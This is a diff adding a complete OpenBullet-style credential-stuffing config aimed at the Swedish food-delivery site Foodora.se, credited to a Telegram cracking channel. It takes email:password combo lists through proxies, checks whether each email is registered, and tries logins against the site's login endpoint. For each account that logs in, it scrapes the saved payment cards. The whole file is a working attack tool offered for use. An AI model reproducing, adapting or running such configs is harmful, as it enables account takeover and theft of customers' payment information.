@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "Foodora.se",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-29T21:25:34.9574679+02:00",
+  "AdditionalInfo": "https://t.me/crackforce",
+  "Author": "@CONFIG_COMBO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.foodora.se/api/v1/customers/email-check" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "origin: https://www.foodora.se" 
+  HEADER "referer: https://www.foodora.se/login/new?step=email" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "has_password\":true" 
+  KEYCHAIN Failure OR 
+    KEY "has_password\":false" 
+
+REQUEST POST "https://www.foodora.se/async_login_check" Multipart 
+  
+  STRINGCONTENT "_target_path: /" 
+  STRINGCONTENT "_username: <USER>" 
+  STRINGCONTENT "_password: <PASS>" 
+  BOUNDARY "290624326912290210114236512026" 
+  HEADER "Host: www.foodora.se" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Device-Fingerprint: 5bc1ec9b0f5e177aab6d2d3ffe897ac9" 
+  HEADER "Content-Type: multipart/form-data; boundary=---------------------------290624326912290210114236512026" 
+  HEADER "Content-Length: 448" 
+  HEADER "Origin: https://www.foodora.se" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.foodora.se/login/new?step=login" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "last_username" 
+    KEY "https://www.foodora.se/async_login" 
+    KEY "Either your email or password wasn't right" 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+
+REQUEST GET "https://www.foodora.se/profile/cards" 
+  
+  HEADER "referer: https://www.foodora.se/en/profile" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "" "" CreateEmpty=FALSE -> CAP "MY PAYMENTS" 
+
+FUNCTION Constant "@CONFIG_COMBO" -> CAP "Config By" 
+
